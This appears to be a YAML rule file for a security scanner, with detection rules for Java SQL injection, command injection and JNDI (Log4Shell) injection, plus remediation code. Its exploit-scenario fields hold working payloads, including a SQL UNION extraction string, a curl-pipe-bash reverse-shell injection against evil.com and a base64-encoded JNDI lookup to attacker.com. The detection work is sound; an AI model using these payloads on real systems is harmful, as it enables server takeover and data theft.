rules:
- rule_id: JAVA-INJ-001
  title: SQL Injection via String Concatenation in Statement
  description: 'Detects JDBC Statement.execute or createStatement with concatenated user input instead of PreparedStatement.
    This includes detection of string-built queries passed to Statement objects, StringBuilder-based query assembly, and indirect
    taint flows from HTTP request parameters into SQL execution sinks.

    '
  language: java
  category: injection
  severity: Critical
  confidence: 0.94
  cwe: CWE-89
  owasp: A03:2021-Injection
  tags:
  - sql-injection
  - jdbc
  - statement
  - taint-flow
  - data-layer
  patterns:
  - type: regex
    pattern: (?:createStatement|Statement)\s*\([^)]*\)\s*\.(?:execute|executeQuery|executeUpdate)\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*["']\s*\+\s*\w+
    description: Statement.execute with inline SQL concatenation
  - type: regex
    pattern: \.(?:executeQuery|executeUpdate|execute)\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*["']\s*\+\s*(?:request|param|input|user|arg)
    description: execute with taint-named variable concatenation
  - type: regex
    pattern: String\s+\w*(?:sql|query|stmt)\w*\s*=\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*["']\s*\+\s*(?:request|param|input|user)
    description: SQL string variable built via concatenation from request sources
  - type: regex
    pattern: (?:createStatement|Statement)\s*\([^)]*\)\s*\.(?:execute\w*)\s*\(\s*\w*(?:sql|query|stmt)\w*\s*\+
    description: Statement execution with variable-based SQL concatenation
  - type: regex
    pattern: \.(?:executeQuery|executeUpdate)\s*\(\s*"[^"]*"\s*\+\s*\w+\.get(?:Parameter|Header|Attribute)\s*\(
    description: Direct getParameter/getHeader concatenation into execute call
  - type: regex
    pattern: StringBuilder\s+\w*(?:sql|query|stmt)\w*\s*=.*\.append\s*\(\s*(?:request|param|input|user|arg)
    description: StringBuilder-based SQL query with tainted append
  - type: regex
    pattern: String\.format\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*%s[^'"]*["']\s*,\s*(?:request|param|input|user)
    description: String.format used to inject user input into SQL template
  - type: regex
    pattern: (?:stmt|statement|st)\s*\.(?:execute|executeQuery|executeUpdate)\s*\(\s*\w+\s*\+\s*\w+\s*\+\s*\w+
    description: Multi-part concatenation passed to statement execution
  - type: regex
    pattern: (?:connection|conn|con)\s*\.createStatement\s*\(\s*\)[\s\S]{0,120}\.execute\w*\s*\(\s*[^)]*\+
    description: createStatement followed by execute with concatenation within nearby lines
  - type: regex
    pattern: MessageFormat\.format\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*\{0\}[^'"]*["']\s*,\s*(?:request|param|input|user)
    description: MessageFormat used to interpolate user input into SQL
  anti_patterns:
  - PreparedStatement
  - prepareStatement
  - setString
  - setInt
  - setObject
  - NamedParameterJdbcTemplate
  - JpaRepository
  - CrudRepository
  - PagingAndSortingRepository
  - JdbcTemplate.query
  - JdbcTemplate.update
  - JdbcTemplate.queryForObject
  - JdbcTemplate.queryForList
  - MapSqlParameterSource
  - BeanPropertySqlParameterSource
  - SqlParameterSource
  - CriteriaBuilder
  - CriteriaQuery
  - Specification
  - QueryDSL
  - JPAQueryFactory
  - '@Query'
  - mybatis
  - '#{param}'
  - SqlSessionFactory
  - MappedStatement
  - TypedQuery
  - StoredProcedureQuery
  - session.createQuery.*setParameter
  - Hibernate.createSQLQuery.*setParameter
  - EntityManager.createNamedQuery
  - spring.data.jpa
  context_awareness:
    surrounding_context_patterns:
    - import java.sql.Statement
    - import java.sql.Connection
    - import java.sql.DriverManager
    - import javax.sql.DataSource
    - implements.*Repository
    - extends.*DaoImpl
    - '@Repository'
    - '@Transactional'
    taint_source_indicators:
    - request.getParameter
    - request.getHeader
    - request.getAttribute
    - request.getQueryString
    - request.getCookies
    - '@RequestParam'
    - '@PathVariable'
    - '@RequestBody'
    - '@RequestHeader'
    - HttpServletRequest
    - ServletRequest
    - WebRequest.getParameter
    - MultipartFile
    taint_sink_indicators:
    - Statement.execute
    - Statement.executeQuery
    - Statement.executeUpdate
    - Statement.executeBatch
    - Statement.addBatch
    - Connection.createStatement
    - Connection.prepareCall
    sanitization_patterns:
    - PreparedStatement
    - prepareStatement
    - setString
    - setInt
    - setLong
    - setObject
    - setFloat
    - setDouble
    - setDate
    - setTimestamp
    - setBoolean
    - StringEscapeUtils.escapeSql
    - ESAPI.encoder().encodeForSQL
    - SQLEncoder
    - Codec.encode
    - Pattern.matches.*[a-zA-Z0-9]
    - InputValidator
    - Validator.validate
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1.0 - sanitization_coverage)
    exploitability_score: High
  exploit_scenario:
    attack_example: 'An attacker discovers a user search endpoint at /api/users?name=. The backend constructs a SQL query
      using string concatenation: "SELECT * FROM users WHERE name = ''" + request.getParameter("name") + "''". The attacker
      submits name='' OR ''1''=''1'' -- which causes the query to return all user records. Escalating further, the attacker
      uses UNION SELECT to extract password hashes from the credentials table and then leverages database-specific functions
      to read server files or execute system commands via xp_cmdshell or LOAD_FILE.

      '
    example_payload: ''' UNION SELECT username, password_hash, email, credit_card FROM users--'
    attacker_objective: Full database exfiltration, authentication bypass, privilege escalation to DBA, potential remote code
      execution via database stored procedures
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  impact: 'SQL injection via JDBC Statement allows full database compromise including

    data exfiltration, record manipulation, schema modification, and in some

    cases remote code execution through database stored procedures.

    '
  remediation: "**Immediate Fix — Use PreparedStatement with parameterized queries:**\n  PreparedStatement ps = conn.prepareStatement(\"\
    SELECT * FROM users WHERE id = ?\");\n  ps.setString(1, userId);\n  ResultSet rs = ps.executeQuery();\n\n**Spring Boot\
    \ / Spring JDBC:**\n  @Autowired JdbcTemplate jdbcTemplate;\n  String sql = \"SELECT * FROM users WHERE name = ?\";\n\
    \  List<User> users = jdbcTemplate.query(sql, new Object[]{name}, new UserRowMapper());\n\n  // Or with NamedParameterJdbcTemplate:\n\
    \  MapSqlParameterSource params = new MapSqlParameterSource();\n  params.addValue(\"name\", name);\n  namedTemplate.query(\"\
    SELECT * FROM users WHERE name = :name\", params, mapper);\n\n**Jakarta EE / JPA (Hibernate):**\n  TypedQuery<User> q\
    \ = em.createQuery(\"SELECT u FROM User u WHERE u.name = :name\", User.class);\n  q.setParameter(\"name\", userInput);\n\
    \  List<User> results = q.getResultList();\n\n  // Or use Spring Data JPA repositories:\n  @Query(\"SELECT u FROM User\
    \ u WHERE u.name = :name\")\n  List<User> findByName(@Param(\"name\") String name);\n\n**Hibernate Criteria API:**\n \
    \ CriteriaBuilder cb = session.getCriteriaBuilder();\n  CriteriaQuery<User> cq = cb.createQuery(User.class);\n  Root<User>\
    \ root = cq.from(User.class);\n  cq.select(root).where(cb.equal(root.get(\"name\"), userInput));\n  List<User> results\
    \ = session.createQuery(cq).getResultList();\n\n**MyBatis — Use #{} (never ${}):**\n  <!-- Safe: parameterized -->\n \
    \ <select id=\"findUser\" resultType=\"User\">\n    SELECT * FROM users WHERE name = #{name}\n  </select>\n\n  <!-- UNSAFE:\
    \ raw interpolation -->\n  <select id=\"findUser\" resultType=\"User\">\n    SELECT * FROM users WHERE name = '${name}'\n\
    \  </select>\n\n**Additional hardening:**\n  - Enable SQL logging in development to audit generated queries\n  - Use a\
    \ Web Application Firewall (WAF) as defense-in-depth\n  - Apply principle of least privilege to database accounts\n  -\
    \ Conduct regular static analysis scans with tools like SpotBugs + Find Security Bugs\n"
  references:
  - https://owasp.org/Top10/A03_2021-Injection/
  - https://cwe.mitre.org/data/definitions/89.html
  - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
  - https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: hardened
    detection_complexity: flow-aware
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - JAVA-INJ-005
    - JAVA-INJ-003
    - JAVA-AUTH-001
    - JAVA-CRYPTO-002
  detection_layer: 1
- rule_id: JAVA-INJ-002
  title: Command Injection via Runtime.exec or ProcessBuilder
  description: 'Detects Runtime.exec() or ProcessBuilder.command() with user-controlled input enabling OS command injection.
    Covers direct invocations, shell wrappers (cmd.exe /c, /bin/sh -c), indirect taint through variable assignment, and commons-exec
    usage with unsanitized arguments.

    '
  language: java
  category: injection
  severity: Critical
  confidence: 0.92
  cwe: CWE-78
  owasp: A03:2021-Injection
  tags:
  - command-injection
  - runtime-exec
  - process-builder
  - rce
  - os-command
  patterns:
  - type: regex
    pattern: Runtime\.getRuntime\s*\(\s*\)\.exec\s*\(\s*(?:request|param|input|user|arg|cmd|command)\b
    description: Runtime.exec with tainted variable name directly
  - type: regex
    pattern: Runtime\.getRuntime\s*\(\s*\)\.exec\s*\(\s*['"](?:[^'"]*["']\s*\+\s*(?:request|param|input|user))
    description: Runtime.exec with string concatenation from request sources
  - type: regex
    pattern: new\s+ProcessBuilder\s*\(\s*(?:Arrays\.asList\s*\()?[^)]*(?:request|param|input|user|arg)\b
    description: ProcessBuilder constructor with tainted argument
  - type: regex
    pattern: ProcessBuilder\s*\([^)]*\)\.command\s*\([^)]*(?:request|param|input|user)\b
    description: ProcessBuilder.command with tainted argument
  - type: regex
    pattern: \.exec\s*\(\s*(?:new\s+String\s*\[\]\s*\{)?[^)]*(?:getParameter|getHeader|getAttribute)\s*\(
    description: exec with direct HttpServletRequest getter
  - type: regex
    pattern: Runtime\.getRuntime\s*\(\s*\)\.exec\s*\(\s*(?:new\s+String\s*\[\]\s*\{)?\s*"(?:/bin/(?:sh|bash)|cmd\.exe|cmd|powershell)[^"]*"\s*,\s*[^)]*(?:request|param|input|user)
    description: Shell invocation (sh/bash/cmd) with tainted arguments
  - type: regex
    pattern: (?:pb|processBuilder|builder)\s*\.command\s*\(\s*(?:Arrays\.asList|List\.of)\s*\([^)]*(?:request|param|input|user|arg)\b
    description: ProcessBuilder.command via List.of/Arrays.asList with tainted input
  - type: regex
    pattern: new\s+CommandLine\s*\(\s*[^)]*(?:request|param|input|user)\b
    description: Apache Commons Exec CommandLine with tainted input
  - type: regex
    pattern: DefaultExecutor\s*\(\s*\)\s*\.execute\s*\(\s*(?:cmd|command|commandLine)\b
    description: Apache Commons Exec DefaultExecutor with variable command
  - type: regex
    pattern: (?:String|var)\s+\w*(?:cmd|command|exec|proc)\w*\s*=\s*['"][^'"]*["']\s*\+\s*(?:request|param|input|user)
    description: Command string variable built via concatenation
  - type: regex
    pattern: ProcessBuilder\s*\([^)]*\)\.start\s*\(
    description: ProcessBuilder.start() — flag for review when nearby tainted input
  - type: regex
    pattern: ScriptEngine\s*.*\.eval\s*\(\s*(?:request|param|input|user|data|arg)\b
    description: ScriptEngine.eval with tainted input enabling code execution
  anti_patterns:
  - sanitize
  - allowList
  - whitelist
  - Pattern.matches
  - StringUtils.isAlphanumeric
  - StringUtils.isAlpha
  - StringUtils.isNumeric
  - Validator.validate
  - InputValidator
  - SecurityManager
  - ProcessBuilder.redirectErrorStream
  - commons.text.StringEscapeUtils
  - ESAPI.encoder
  - Encoder.encodeForOS
  - CommandLine.addArgument.*false
  - Collections.unmodifiableList
  - enum
  - switch.*case
  - EnumSet.contains
  - hardcodedCommands.contains
  - ALLOWED_COMMANDS
  context_awareness:
    surrounding_context_patterns:
    - import java.lang.Runtime
    - import java.lang.ProcessBuilder
    - import java.lang.Process
    - import org.apache.commons.exec
    - import javax.script.ScriptEngine
    - '@Controller'
    - '@RestController'
    - '@Service'
    - implements CommandExecutor
    taint_source_indicators:
    - request.getParameter
    - request.getHeader
    - '@RequestParam'
    - '@PathVariable'
    - '@RequestBody'
    - args[0]
    - System.getProperty
    - System.getenv
    - Scanner.nextLine
    - BufferedReader.readLine
    - MultipartFile.getOriginalFilename
    - HttpServletRequest
    taint_sink_indicators:
    - Runtime.getRuntime().exec
    - ProcessBuilder.start
    - ProcessBuilder.command
    - DefaultExecutor.execute
    - ScriptEngine.eval
    - GroovyShell.evaluate
    - Interpreter.eval
    sanitization_patterns:
    - Pattern.matches("[a-zA-Z0-9]+"
    - StringUtils.isAlphanumeric
    - allowList.contains
    - Arrays.asList(ALLOWED).contains
    - EnumSet.contains
    - org.owasp.encoder
    - ESAPI.encoder().encodeForOS
    - Validator.isValid
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * (1.0 - sanitization_coverage) * environment_exposure
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A file-conversion microservice exposes an endpoint /api/convert?filename= that uses Runtime.exec() to
      invoke an external tool: Runtime.getRuntime().exec("convert " + request.getParameter("filename") + " output.pdf"). An
      attacker submits filename=;curl+attacker.com/shell.sh|bash which is concatenated into the command string. The shell
      interprets the semicolon as a command separator and executes the attacker''s reverse-shell script. The attacker gains
      interactive shell access to the server with the privileges of the Java process.

      '
    example_payload: test.png; curl http://evil.com/rev.sh | /bin/bash
    attacker_objective: Remote code execution on the application server, establishing persistence via reverse shell, lateral
      movement within internal network
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: high
    sanitization_absence: high
  impact: 'Arbitrary OS command execution on the server, enabling full system compromise,

    data exfiltration, privilege escalation, and lateral movement.

    '
  remediation: "**Immediate Fix — Avoid shell invocation entirely:**\n  // UNSAFE:\n  Runtime.getRuntime().exec(\"convert\
    \ \" + filename + \" output.pdf\");\n\n  // SAFE: pass arguments as array (no shell interpretation):\n  ProcessBuilder\
    \ pb = new ProcessBuilder(\"convert\", sanitizedFilename, \"output.pdf\");\n  pb.redirectErrorStream(true);\n  Process\
    \ p = pb.start();\n\n**Spring Boot:**\n  // Use Java libraries instead of shelling out:\n  @Service\n  public class FileConversionService\
    \ {\n      public byte[] convert(MultipartFile file) {\n          // Use Apache PDFBox, iText, or similar Java library\n\
    \          // Never pass user filenames to OS commands\n          String safeName = UUID.randomUUID().toString() + \"\
    .pdf\";\n          // ... pure-Java conversion logic\n      }\n  }\n\n**Jakarta EE:**\n  // Validate against strict allowlist:\n\
    \  private static final Set<String> ALLOWED = Set.of(\"png\", \"jpg\", \"gif\");\n  public void processFile(String format)\
    \ {\n      if (!ALLOWED.contains(format.toLowerCase())) {\n          throw new IllegalArgumentException(\"Unsupported\
    \ format\");\n      }\n      // Only then use the validated format\n  }\n\n**Apache Commons Exec (if shell-out is unavoidable):**\n\
    \  CommandLine cmdLine = new CommandLine(\"convert\");\n  cmdLine.addArgument(sanitizedFilename, false); // false = no\
    \ quoting substitution\n  cmdLine.addArgument(\"output.pdf\", false);\n  DefaultExecutor executor = new DefaultExecutor();\n\
    \  executor.setWatchdog(new ExecuteWatchdog(30000));\n  executor.execute(cmdLine);\n\n**Additional hardening:**\n  - Run\
    \ the JVM with a SecurityManager restricting exec permissions\n  - Use containerized sandboxes for external tool invocations\n\
    \  - Apply network egress filtering to prevent reverse shell callbacks\n  - Log all command executions with arguments\
    \ for audit\n"
  references:
  - https://cwe.mitre.org/data/definitions/78.html
  - https://owasp.org/Top10/A03_2021-Injection/
  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
  metadata:
    rule_version: 2.0.0
    last_reviewed: '2025-01-15'
    rule_maturity_level: hardened
    detection_complexity: flow-aware
  cross_rule_intelligence:
    cross_file_risk_flag: true
    requires_ai_validation: true
    high_impact_flag: true
    related_rules:
    - JAVA-INJ-001
    - JAVA-INJ-003
    - JAVA-INJ-004
    - JAVA-PATH-001
  detection_layer: 1
- rule_id: JAVA-INJ-003
  title: JNDI Injection (Log4Shell Pattern)
  description: 'Detects potential JNDI lookup injection through user-controlled input passed to logging frameworks or JNDI
    context lookups. Covers Log4j2 message lookup exploitation (CVE-2021-44228), direct InitialContext.lookup with tainted
    strings, JMS destination lookups, and DataSource JNDI references with user-influenced names.

    '
  language: java
  category: injection
  severity: Critical
  confidence: 0.88
  cwe: CWE-917
  owasp: A03:2021-Injection
  tags:
  - jndi-injection
  - log4shell
  - rce
  - deserialization
  - cve-2021-44228
  - logging
  patterns:
  - type: regex
    pattern: (?:logger|log|LOG)\s*\.(?:info|warn|error|debug|trace|fatal)\s*\(\s*(?:request|param|input|user|header|cookie)\b
    description: Logger method called with tainted variable directly
  - type: regex
    pattern: InitialContext\s*\(\s*\)\s*\.lookup\s*\(\s*(?:request|param|input|user|data)\b
    description: InitialContext.lookup with tainted argument
  - type: regex
    pattern: (?:ctx|context|ic|initialContext)\s*\.lookup\s*\(\s*(?:request|param|input|user|data|arg)\b
    description: Context.lookup with tainted variable name
  - type: regex
    pattern: (?:logger|log)\s*\.\w+\s*\(\s*['"][^'"]*["']\s*\+\s*(?:request|param|input|user)\b
    description: Logger with concatenated user input
  - type: regex
    pattern: 'JndiLookup|JMSAppender|SocketServer|jndi:'
    description: Direct JNDI lookup class or protocol reference
  - type: regex
    pattern: (?:logger|log|LOG)\s*\.(?:info|warn|error|debug|trace|fatal)\s*\(\s*[^)]*request\.get(?:Parameter|Header|QueryString|RemoteAddr)\s*\(
    description: Logger with direct request getter invocation
  - type: regex
    pattern: (?:logger|log|LOG)\s*\.(?:info|warn|error|debug|trace|fatal)\s*\(\s*String\.format\s*\([^)]*(?:request|param|input|user)\b
    description: Logger with String.format containing tainted input
  - type: regex
    pattern: (?:ctx|context|initialContext|ic)\s*\.lookup\s*\(\s*['"](?:ldap|rmi|dns|iiop|corba)://[^'"]*["']
    description: JNDI lookup with remote protocol URI
  - type: regex
    pattern: (?:ctx|context)\s*\.lookup\s*\(\s*['"][^'"]*["']\s*\+\s*\w+
    description: JNDI lookup with concatenated dynamic component
  - type: regex
    pattern: NamingManager\.getObjectInstance|DirectoryManager\.getObjectInstance
    description: NamingManager/DirectoryManager object resolution — potential deserialization point
  - type: regex
    pattern: new\s+InitialDirContext\s*\(\s*[^)]*(?:request|param|input|user)\b
    description: InitialDirContext with tainted environment properties
  - type: regex
    pattern: JMSContext\s*.*\.createQueue\s*\(\s*(?:request|param|input|user|data)\b
    description: JMS queue creation with tainted destination name
  anti_patterns:
  - log4j2.formatMsgNoLookups=true
  - LOG4J_FORMAT_MSG_NO_LOOKUPS
  - PatternLayout.disableAnsi
  - '%m{nolookups}'
  - log4j-2.17
  - log4j-2.18
  - log4j-2.19
  - log4j-2.20
  - log4j-2.21
  - log4j-2.22
  - log4j-2.23
  - log4j-2.24
  - JndiLookup.class
  - zip -q -d.*JndiLookup
  - SANITIZE
  - encode
  - stripJndi
  - JNDI_DENY_LIST
  - allowedProtocols
  - allowedHosts
  - com.sun.jndi.ldap.object.trustURLCodebase=false
  - com.sun.jndi.rmi.object.trustURLCodebase=false
  context_awareness:
    surrounding_context_patterns:
    - import org.apache.logging.log4j
    - import org.slf4j
    - import java.util.logging
    - import javax.naming
    - import javax.naming.InitialContext
    - import javax.naming.directory
    - LoggerFactory.getLogger
    - LogManager.getLogger
    - '@Slf4j'
    - '@Log4j2'
    taint_source_indicators:
    - request.getParameter
    - request.getHeader
    - request.getQueryString
    - request.getRemoteAddr
    - request.getCookies
    - '@RequestParam'
    - '@RequestHeader'
    - '@PathVariable'
    - '@CookieValue'
    - HttpServletRequest
    - X-Forwarded-For
    - User-Agent
    - Referer
    taint_sink_indicators:
    - Logger.info
    - Logger.warn
    - Logger.error
    - Logger.debug
    - Logger.trace
    - Logger.fatal
    - InitialContext.lookup
    - Context.lookup
    - DirContext.search
    - JndiTemplate.lookup
    sanitization_patterns:
    - log4j2.formatMsgNoLookups
    - '%m{nolookups}'
    - Encode.forJava
    - StringEscapeUtils.escapeJava
    - ESAPI.encoder().encodeForLDAP
    - stripXSS
    - HtmlUtils.htmlEscape
    - Pattern.matches.*[a-zA-Z0-9]
  severity_scoring:
    severity_weight: 10
    risk_score_formula_hint: severity_weight * confidence * log4j_version_vulnerability_factor * network_exposure
    exploitability_score: High
  exploit_scenario:
    attack_example: 'A Spring Boot application running Log4j2 < 2.17.0 logs HTTP request headers for debugging. An attacker
      sends a crafted request with the header X-Api-Token: ${jndi:ldap://attacker.com:1389/Exploit}. When the application
      logs this header value, Log4j2 performs a JNDI lookup to the attacker-controlled LDAP server. The LDAP server responds
      with a reference to a remote Java class file. The JVM downloads and instantiates this class, executing the attacker''s
      payload — typically a reverse shell or crypto-miner — with the full privileges of the Java process.

      '
    example_payload: ${jndi:ldap://attacker.com:1389/TomcatBypass/Command/Base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNofGJhc2g=}
    attacker_objective: Remote code execution via JNDI deserialization, establishing C2 channel, lateral movement, cryptomining,
      data exfiltration
  confidence_factors:
    pattern_strength: high
    context_match: high
    proximity_to_user_input: medium
    sanitization_absence: high
  impact: 'JNDI injection (CVE-2021-44228 — Log4Shell) enables remote code execution

    by triggering JNDI lookups to attacker-controlled LDAP/RMI servers, which

    serve malicious Java classes for deserialization.

    '
  remediation: "**Immediate Fix — Upgrade Log4j:**\n  - Upgrade Log4j2 to 2.17.1+ (for Java 8) or 2.12.4+ (for Java 7)\n \
    \ - Use the latest available version for ongoing protection\n\n**Spring Boot:**\n  // In application.properties or application.yml:\n\
    \  logging.level.root=INFO\n  // Override Log4j2 version in pom.xml:\n  <properties>\n    <log4j2.version>2.23.1</log4j2.version>\n\
    \  </properties>\n\n  // Use parameterized logging — NEVER concatenate:\n  // UNSAFE:\n  log.info(\"User login: \" + request.getHeader(\"\
    X-User\"));\n  // SAFE:\n  log.info(\"User login: {}\", sanitize(request.getHeader(\"X-User\")));\n\n**Jakarta EE:**\n\
    \  // Validate JNDI names against allowlist:\n  private static final Set<String> ALLOWED_JNDI = Set.of(\n      \"java:comp/env/jdbc/myDB\"\
    ,\n      \"java:comp/env/mail/Session\"\n  );\n  public Object safeLookup(String name) throws NamingException {\n    \
    \  if (!ALLOWED_JNDI.contains(name)) {\n          throw new SecurityException(\"JNDI name not in allowlist\");\n     \
    \ }\n      return new InitialContext().lookup(name);\n  }\n\n**Hibernate / JPA:**\n  // Ensure DataSource JNDI names are\
    \ hardcoded in configuration:\n  // persistence.xml:\n  <jta-data-source>java:comp/env/jdbc/myDB</jta-data-source>\n \
    \ // Never derive JNDI names from user input\n\n**MyBatis:**\n  // In mybatis-config.xml, use hardcoded environment references:\n\
    \  <dataSource type=\"JNDI\">\n    <property name=\"data_source\" value=\"java:comp/env/jdbc/myDB\"/>\n  </dataSource>\n\
    \n**Network-level hardening:**\n  - Block outbound LDAP (389, 636, 1389), RMI (1099), and DNS to untrusted hosts\n  -\
    \ Set JVM flags: -Dcom.sun.jndi.ldap.object.trustURLCodebase=false\n  - Set JVM flags: -Dcom.sun.jndi.rmi.object.trustURLCodebase=false\n\
    \  - Remove JndiLookup class from log4j-core JAR as defense-in-depth\n"
  references:
